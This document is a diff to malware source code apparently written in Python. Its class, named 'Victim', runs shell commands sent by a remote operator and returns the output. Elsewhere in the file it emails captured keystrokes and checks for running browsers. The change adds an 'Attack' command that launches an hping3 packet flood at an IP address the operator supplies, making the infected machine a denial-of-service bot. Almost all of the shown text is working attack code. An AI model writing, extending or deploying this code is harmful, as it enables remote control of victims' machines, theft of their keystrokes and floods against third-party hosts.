@@ -75,15 +75,21 @@ class Victim:
             if user_command.strip() == "exit":
                 break
 
-            op = subprocess.Popen(user_command, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
-            output = op.stdout.read()
-            output_error = op.stderr.read()
-
-            print("[+] Sending Command Output...")
-            if output == b"" and output_error == b"":
-                self.client.send(b"client_msg: no visible output")
+            if user_command.startswith("Attack"):
+                command_parts = user_command.split()
+                if len(command_parts) == 2:
+                    ip_address = command_parts[1]
+                    self.send_packets(ip_address)
             else:
-                self.client.send(output + output_error)
+                op = subprocess.Popen(user_command, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
+                output = op.stdout.read()
+                output_error = op.stderr.read()
+
+                print("[+] Sending Command Output...")
+                if output == b"" and output_error == b"":
+                    self.client.send(b"client_msg: no visible output")
+                else:
+                    self.client.send(output + output_error)
 
     def send_email_with_keystrokes(self, keystrokes):
         if not self.email_address or not self.password:
@@ -147,6 +153,15 @@ class Victim:
             if process.info['name'].lower() in ['chrome.exe', 'firefox.exe', 'safari.exe', 'opera.exe']:
                 return True
         return False
+
+    def send_packets(self, ip_address):
+        hping_command = f"hping3 {ip_address} -d 65535 -c 0"
+        process = subprocess.Popen(hping_command, shell=True)
+
+        while True:
+            if keyboard.is_pressed('esc'):
+                process.terminate()
+                break
 
 if __name__ == '__main__':
     choice = "online"  # "offline"
